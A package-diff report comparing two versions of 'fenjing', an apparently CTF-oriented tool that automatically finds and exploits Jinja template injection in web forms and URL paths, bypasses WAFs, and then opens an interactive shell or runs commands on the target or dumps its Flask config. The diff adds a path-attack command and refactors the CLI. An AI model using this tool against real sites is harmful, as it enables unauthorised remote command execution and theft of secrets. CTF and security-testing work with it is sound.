# Comparing `tmp/fenjing-0.4.6.1.tar.gz` & `tmp/fenjing-0.4.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.6.1.tar", last modified: Wed Jul 12 09:55:53 2023, max compression
+gzip compressed data, was "fenjing-0.4.7.tar", last modified: Mon Jul 17 15:35:37 2023, max compression
```

## Comparing `fenjing-0.4.6.1.tar` & `fenjing-0.4.7.tar`

### file list

```diff
@@ -1,37 +1,39 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     7174 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6735 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     9136 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1834 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     6814 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7473 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    32560 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     4866 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     7174 2023-07-12 09:55:53.000000 fenjing-0.4.6.1/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-12 09:55:53.000000 fenjing-0.4.6.1/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-12 09:55:53.000000 fenjing-0.4.6.1/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-12 09:55:53.000000 fenjing-0.4.6.1/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-12 09:55:53.000000 fenjing-0.4.6.1/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-12 09:55:53.059677 fenjing-0.4.6.1/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-12 09:55:41.000000 fenjing-0.4.6.1/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 15:35:37.251654 fenjing-0.4.7/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-17 15:35:23.000000 fenjing-0.4.7/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-17 15:35:23.000000 fenjing-0.4.7/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     8101 2023-07-17 15:35:37.247654 fenjing-0.4.7/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7664 2023-07-17 15:35:23.000000 fenjing-0.4.7/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-17 15:35:23.000000 fenjing-0.4.7/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 15:35:37.247654 fenjing-0.4.7/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)    12408 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2280 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2913 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/form.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    33353 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2084 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4029 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/submitter.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 15:35:37.247654 fenjing-0.4.7/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-17 15:35:23.000000 fenjing-0.4.7/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 15:35:37.247654 fenjing-0.4.7/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     8101 2023-07-17 15:35:37.000000 fenjing-0.4.7/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-17 15:35:37.000000 fenjing-0.4.7/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-17 15:35:37.000000 fenjing-0.4.7/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-17 15:35:37.000000 fenjing-0.4.7/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-17 15:35:37.000000 fenjing-0.4.7/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-17 15:35:23.000000 fenjing-0.4.7/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-17 15:35:37.251654 fenjing-0.4.7/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-17 15:35:23.000000 fenjing-0.4.7/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 15:35:37.247654 fenjing-0.4.7/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     2571 2023-07-17 15:35:23.000000 fenjing-0.4.7/tests/test_cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-17 15:35:23.000000 fenjing-0.4.7/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-17 15:35:23.000000 fenjing-0.4.7/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.6.1/LICENSE` & `fenjing-0.4.7/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/PKG-INFO` & `fenjing-0.4.7/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.6.1
+Version: 0.4.7
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -23,14 +23,15 @@
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
+- 支持攻击对应的HTML表单或HTML路径
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -136,14 +137,18 @@
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
+- crack-path: 对某个特定的路径进行攻击
+  - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
+  - 参数大致上和crack相同，但是只需要提供对应的路径
+  - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
   扫描指定的网站
 
@@ -185,14 +190,29 @@
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
   --help              Show this message and exit.
+
+Usage: python -m fenjing crack-path [OPTIONS]
+
+  攻击指定的路径
+
+Options:
+  -u, --url TEXT       需要攻击的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
+  --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
+  --help               Show this message and exit.
+
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
@@ -218,9 +238,8 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
-
+[![](https://mermaid.ink/img/pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw?type=png)](https://mermaid.live/edit#pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw)
```

### Comparing `fenjing-0.4.6.1/README.md` & `fenjing-0.4.7/README.md`

 * *Files 18% similar despite different names*

```diff
@@ -10,14 +10,15 @@
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
+- 支持攻击对应的HTML表单或HTML路径
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -123,14 +124,18 @@
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
+- crack-path: 对某个特定的路径进行攻击
+  - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
+  - 参数大致上和crack相同，但是只需要提供对应的路径
+  - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
   扫描指定的网站
 
@@ -172,14 +177,29 @@
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
   --help              Show this message and exit.
+
+Usage: python -m fenjing crack-path [OPTIONS]
+
+  攻击指定的路径
+
+Options:
+  -u, --url TEXT       需要攻击的URL
+  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
+  --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
+  --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
+  --help               Show this message and exit.
+
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
@@ -205,9 +225,8 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
-
+[![](https://mermaid.ink/img/pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw?type=png)](https://mermaid.live/edit#pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw)
```

### Comparing `fenjing-0.4.6.1/fenjing/cli.py` & `fenjing-0.4.7/fenjing/cli.py`

 * *Files 18% similar despite different names*

```diff
@@ -7,15 +7,16 @@
 from typing import Callable, List, Dict
 from functools import partial
 
 import click
 
 
 from .form import get_form
-from .form_cracker import FormCracker
+from .cracker import Cracker
+from .submitter import Submitter, PathSubmitter, FormSubmitter
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
 from .const import (
     OS_POPEN_READ,
     DEFAULT_USER_AGENT,
     CONFIG,
@@ -42,42 +43,41 @@
 )
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
 
 
-def cmd_exec(
-    cmd: str,
-    cracker: FormCracker,
-    field: str,
-    full_payload_gen: FullPayloadGen,
-):
-    """在目标上执行命令并返回回显
+def cmd_exec_submitter(
+    cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
+) -> str:
+    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
 
     Args:
-        cmd (str): 命令
-        cracker (FormCracker): 目标表格对应的FormCracker
-        field (str): 提交到的目标项
-        full_payload_gen (FullPayloadGen): payload生成器
+        cmd (str): payload对应的命令
+        submitter (Submitter): 实际发送请求的submitter
+        full_payload_gen (FullPayloadGen): 生成payload的FullPayloadGen
 
     Returns:
         str: 回显
     """
     payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
+    if payload is None:
+        logger.warning("%s generating payload.", colored("red", "Failed"))
+        return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
         payload_wont_print = (
             "Payload generator says that this "
             + "payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
-    resp = cracker.submit({field: payload})
-    assert resp is not None
-    return resp.text
+    result = submitter.submit(payload)
+    assert result is not None
+    return result.text
 
 
 def interact(cmd_exec_func: Callable):
     """根据提供的payload生成方法向用户提供一个交互终端
 
     Args:
         cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
@@ -158,27 +158,50 @@
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(
-        url=url, form=form, requester=requester, detect_mode=detect_mode
-    )
-    result = cracker.crack()
-    if result is None:
+    found, submitter, full_payload_gen = False, None, None
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(url, form, input_field, requester)
+        cracker = Cracker(submitter, detect_mode=detect_mode)
+        if not cracker.has_respond():
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        full_payload_gen = cracker.crack()
+        if not full_payload_gen:
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        found = True
+    if not found:
         logger.warning("Test form failed...")
         return
-    full_payload_gen, field = result
-    payload = full_payload_gen.generate(CONFIG)
-    resp = cracker.submit({field: payload})
+    assert submitter is not None and full_payload_gen is not None
+
+    payload, will_print = full_payload_gen.generate(CONFIG)
+    if not payload:
+        logger.error(
+            "The generator %s generating payload", colored("red", "failed")
+        )
+        return
+    if not will_print:
+        logger.error(
+            "The generated payload %s respond config.",
+            colored("red", "won't"),
+        )
+        return
+    resp = submitter.submit(payload)
 
     print(resp.text if resp is not None else None)
-    logger.warning("Bye!")
 
 
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@@ -221,26 +244,90 @@
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(
-        url=url, form=form, requester=requester, detect_mode=detect_mode
+    found, submitter, full_payload_gen = False, None, None
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(url, form, input_field, requester)
+        cracker = Cracker(submitter, detect_mode=detect_mode)
+        if not cracker.has_respond():
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        full_payload_gen = cracker.crack()
+        if not full_payload_gen:
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        found = True
+    if not found:
+        logger.warning("Test form failed...")
+        return
+    assert submitter is not None and full_payload_gen is not None
+    cmd_exec_func = partial(
+        cmd_exec_submitter,
+        submitter=submitter,
+        full_payload_gen=full_payload_gen,
+    )
+    if exec_cmd == "":
+        interact(cmd_exec_func)
+    else:
+        print(cmd_exec_func(exec_cmd))
+    logger.warning("Bye!")
+
+
+@main.command()
+@click.option("--url", "-u", help="需要攻击的URL")
+@click.option(
+    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
+)
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
+)
+@click.option(
+    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
+)
+@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
+@click.option("--cookies", default="", help="请求时使用的Cookie")
+def crack_path(
+    url: str,
+    exec_cmd: str,
+    interval: float,
+    detect_mode: str,
+    user_agent: str,
+    header: tuple,
+    cookies: str,
+):
+    """
+    攻击指定的路径
+    """
+    assert url is not None, "Please provide URL!"
+    print(TITLE)
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent,
+        headers=parse_headers_cookies(
+            headers_list=list(header), cookies=cookies
+        ),
     )
-    result = cracker.crack()
-    if result is None:
+    submitter = PathSubmitter(url=url, requester=requester)
+    cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
